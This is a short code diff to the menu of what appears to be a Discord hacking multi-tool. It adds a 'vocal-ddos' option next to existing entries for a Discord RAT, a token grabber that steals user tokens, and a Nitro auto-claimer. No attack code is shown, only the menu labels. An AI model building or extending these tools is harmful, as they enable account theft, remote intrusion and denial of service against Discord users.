@@ -80,6 +80,7 @@ menus = {
             {"name": "rat", "desc": "Discord Rat (in dev)"},
             {"name": "Token-Grabber", "desc": "Récupération de tokens"},
             {"name": "nitro-auto-claim", "desc": "Auto-claim de nitro"},
+            {"name": "vocal-ddos", "desc": "DDoS vocal"},
         ]
     },
     "4": {
